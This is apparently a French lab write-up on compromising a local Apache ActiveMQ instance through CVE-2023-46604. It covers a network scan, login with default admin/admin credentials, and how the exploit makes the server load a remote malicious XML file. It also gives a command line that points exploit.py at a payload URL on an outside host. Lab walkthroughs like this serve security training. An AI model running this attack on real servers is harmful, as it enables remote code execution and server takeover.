
## ActiveMQ_2023

### Scan du Réseau
Pour ActiveMQ_2023, l'adresse IP assignée est `172.21.0.1`. Voici une capture d'écran illustrant le scan du réseau :

![activemq_2023_1](https://github.com/user-attachments/assets/0eb90016-ac2b-4920-b0f2-61c5d08576a2)

Grâce à ce scan, nous avons identifié que le port d'intérêt pour accéder à l'interface est le **8161**. Pour accéder à la console web, utilisez le lien suivant : [http://localhost:8161](http://localhost:8161).

### Version d'ActiveMQ
Pour déterminer la version d'ActiveMQ, connectez-vous à la console d'administration avec les informations d'identification par défaut :

- **Login** : `admin`
- **Mot de passe** : `admin`

![activemq_2023_2](https://github.com/user-attachments/assets/9e77e2fb-be08-46e1-84db-08ac8387d226)

### CVE Score
La vulnérabilité **CVE-2023-46604** est associée à cette version d'ActiveMQ.

![activemq_2023_cve](https://github.com/user-attachments/assets/d7a87a84-a605-4370-84e1-c7bf30a4d1b2)

## Stratégie de Compromission

[Stratégie de compromission](compromission2023.py)
[Stratégie de compromission xml](compromission2023.xml)

## Exploitation/Explication

### Objectif du Module
Le module utilise une vulnérabilité critique dans ActiveMQ, permettant l'exécution de code à distance (CVSS de 9.8 à 10.0). En envoyant un fichier XML malveillant, l'attaquant peut exécuter du code arbitraire et compromettre le serveur.

### Fonctionnement

1. **Connexion au Serveur** : Le script se connecte au serveur ActiveMQ via une connexion socket à l’adresse IP et au port spécifiés (ex. `61616`).

2. **Envoi du Payload** : Le script envoie un flux de données binaires contenant le nom d'une classe Java (`ClassPathXmlApplicationContext`) et l'URL d’un fichier XML malveillant (`poc.xml`).

3. **Chargement du Fichier XML** : Le serveur charge le fichier XML distant qui contient le code malveillant, permettant l'exécution de commandes sur le serveur ActiveMQ.

### Exemple d'Exploitation

Lancer l'attaque avec :

```bash
python3 exploit.py 127.0.0.1 61616 http://192.168.0.101:8888/poc.xml
```

### Impact
L'exploitation réussie permet à l'attaquant de prendre le contrôle du serveur, avec des impacts majeurs sur la confidentialité, l'intégrité et la disponibilité du système.
